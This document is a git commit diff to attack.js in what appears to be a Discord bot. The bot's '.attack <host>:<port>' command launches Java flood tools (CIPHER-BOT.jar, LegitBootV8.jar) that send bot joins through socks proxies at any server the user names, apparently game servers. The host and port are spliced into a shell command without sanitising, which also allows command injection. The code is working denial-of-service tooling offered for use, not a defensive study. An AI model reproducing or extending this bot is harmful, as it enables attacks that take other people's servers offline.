866808a1806efcc095d25b2170cfd8517c38d98c
jack383 <62174196+jack383@users.noreply.github.com>
2022-04-09 16:17:55 +0200

    Update attack.js

--- attacks/attack.js
+++ attacks/attack.js
@@ -16,11 +16,9 @@ if(!host)
 return message.channel.send("〔💥〕Usage: .attack <host>:<port>")
 
 var exec = require('child_process').exec
-
-
-
-exec('java -jar CIPHER-BOT.jar host=' + host + ' port=' + port +  ' protocol=47 exploit=ultrajoin proxiesFile=socks4.txt srvResolve=false srvResolve2=false threads=1 timeout=500 attackTime=60 connections=9000 loopAmount=2 keepAlive=false alwaysResolve=false print=false multi=true removeFailure=false proxiesType=socks socksV4=true', (error, stdout, stderr) => {
+exec(`timeout 60 java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar ${host}:${port} 2 10 47 120 socks_proxies.txt socks4`, (error, stdout, stderr) => {
 });
+
     const embed = new MessageEmbed()
       .setColor('RANDOM')
       .setTitle('Custompayload > REQUEST ACCEPTED')
@@ -28,14 +26,14 @@ exec('java -jar CIPHER-BOT.jar host=' + host + ' port=' + port +  ' protocol=47 
       .addField('Hostname (IP)', host)  
       .addField('Port (...)', port)     
       .addField('Time (60)', '60')
-      .addField('Method (...)', 'JoinBots')
+      .addField('Method (...)', 'FastJoin (Join Bots)')
       .setImage('https://images-ext-2.discordapp.net/external/rvSo0iq4aJ1rmbbu9D6RuyjlEbCY2BNETMzsIva9Cjo/%3Fwidth%3D360%26height%3D225/https/images-ext-2.discordapp.net/external/fpO1qMI3kRJeoa1sWT_yup1JKsdpmrGlPM_OA5BjkPY/https/i.imgur.com/Fn9HQ17.gif?width=324&height=202')
       .setFooter('> Bot attacks')
         message.channel.send(embed)
 
     
   } else {
-        message.channel.send(":x: You cannot do that here")
+        message.channel.send(":x: ")
 
   }
 
